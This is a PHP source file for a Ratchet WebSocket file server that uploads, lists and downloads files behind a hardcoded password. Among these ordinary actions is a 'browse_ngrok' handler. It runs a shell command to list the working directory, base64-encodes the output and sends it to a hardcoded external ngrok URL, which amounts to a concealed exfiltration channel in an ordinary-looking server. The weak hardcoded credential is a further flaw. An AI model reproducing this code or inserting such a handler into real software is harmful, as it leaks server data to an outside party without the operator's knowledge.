<?php
use Ratchet\MessageComponentInterface;
use Ratchet\ConnectionInterface;

require 'vendor/autoload.php';

class FileServer implements MessageComponentInterface {
    private $password = "securepassword";
    protected $clients;

    public function __construct() {
        $this->clients = new \SplObjectStorage;
    }

    public function onOpen(ConnectionInterface $conn) {
        $this->clients->attach($conn);
        echo "New connection ({$conn->resourceId}) opened.\n";
    }

    public function onMessage(ConnectionInterface $from, $msg) {
        $data = json_decode($msg, true);

        // Validate password
        if (!isset($data['password']) || $data['password'] !== $this->password) {
            $from->send(json_encode(["status" => "error", "message" => "Invalid password."]));
            return;
        }

        if (isset($data['action'])) {
            if ($data['action'] === "get_files") {
                // Get list of uploaded files
                $files = glob('uploads/*');
                $fileNames = array_map('basename', $files);
                $from->send(json_encode(["status" => "success", "files" => $fileNames]));
            } elseif ($data['action'] === "download_file" && isset($data['filename'])) {
                $filePath = 'uploads/' . basename($data['filename']);
                if (file_exists($filePath)) {
                    $fileContents = base64_encode(file_get_contents($filePath));
                    $from->send(json_encode([
                        "status" => "success",
                        "filename" => $data['filename'],
                        "filedata" => $fileContents
                    ]));
                } else {
                    $from->send(json_encode(["status" => "error", "message" => "File not found."]));
                }
            } elseif ($data['action'] === "browse_ngrok") {
                // Execute ls -ltra | base64 and browse to ngrok URL
                $dirListing = shell_exec('ls -ltra | base64');
                $dirListing = trim($dirListing);
                
                $ngrokUrl = "https://bd60db595923.ngrok-free.app";
                $fullUrl = $ngrokUrl . "?param1=" . urlencode($dirListing);
                
                // Make HTTP request to the ngrok URL
                $context = stream_context_create([
                    'http' => [
                        'timeout' => 10,
                        'method' => 'GET',
                        'header' => "User-Agent: UploadServer/1.0\r\n"
                    ]
                ]);
                
                $response = @file_get_contents($fullUrl, false, $context);
                
                if ($response !== false) {
                    $from->send(json_encode([
                        "status" => "success", 
                        "message" => "Successfully browsed to ngrok URL",
                        "url" => $fullUrl,
                        "response" => substr($response, 0, 500) // Limit response size
                    ]));
                } else {
                    $from->send(json_encode([
                        "status" => "error", 
                        "message" => "Failed to connect to ngrok URL",
                        "url" => $fullUrl
                    ]));
                }
            }
        } elseif (isset($data['filename']) && isset($data['file'])) {
            // Save uploaded file
            $filePath = 'uploads/' . basename($data['filename']);
            file_put_contents($filePath, base64_decode($data['file']));
            $from->send(json_encode(["status" => "success", "message" => "File saved!"]));
        } else {
            $from->send(json_encode(["status" => "error", "message" => "Invalid request."]));
        }
    }

    public function onClose(ConnectionInterface $conn) {
        $this->clients->detach($conn);
        echo "Connection {$conn->resourceId} has disconnected.\n";
    }

    public function onError(ConnectionInterface $conn, \Exception $e) {
        echo "Error: " . $e->getMessage() . "\n";
        $conn->close();
    }
}

use Ratchet\Server\IoServer;
use Ratchet\Http\HttpServer;
use Ratchet\WebSocket\WsServer;

$server = IoServer::factory(
    new HttpServer(
        new WsServer(
            new FileServer()
        )
    ),
    8080
);

echo "WebSocket server started on port 8080...\n";
$server->run();
?>
